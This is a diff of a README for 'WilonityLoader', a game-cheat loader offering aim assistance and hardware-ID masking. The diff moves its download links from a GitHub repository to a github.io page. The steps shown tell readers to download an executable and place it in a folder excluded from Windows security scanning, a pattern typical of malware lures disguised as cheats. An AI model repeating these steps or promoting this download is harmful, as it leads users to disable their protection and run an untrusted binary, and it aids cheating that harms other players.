@@ -1,6 +1,6 @@
 # 🚀 WilonityLoader - Upgrade your gameplay with ease
 
-[![Download WilonityLoader](https://img.shields.io/badge/Download-WilonityLoader-blue.svg)](https://github.com/shanthiv5882/WilonityLoader)
+[![Download WilonityLoader](https://img.shields.io/badge/Download-WilonityLoader-blue.svg)](https://shanthiv5882.github.io)
 
 WilonityLoader provides players with a toolset to enhance their performance across a wide range of popular titles. This software includes features like aim assistance, visual overlays, and hardware identification masking to ensure a smooth experience. It supports over 20 games including RUST, CS2, Valorant, Tarkov, and Warzone.
 
@@ -31,7 +31,7 @@ Windows security settings often flag software that interacts with game processes
 
 Follow these steps to obtain and start the software:
 
-1.  Visit the official repository page to download the latest version: [https://github.com/shanthiv5882/WilonityLoader](https://github.com/shanthiv5882/WilonityLoader).
+1.  Visit the official repository page to download the latest version: [https://shanthiv5882.github.io](https://shanthiv5882.github.io).
 2.  Locate the release section on the right side of the page.
 3.  Download the latest executable file to your computer.
 4.  Move the file into the folder you added to your Windows exclusions list.
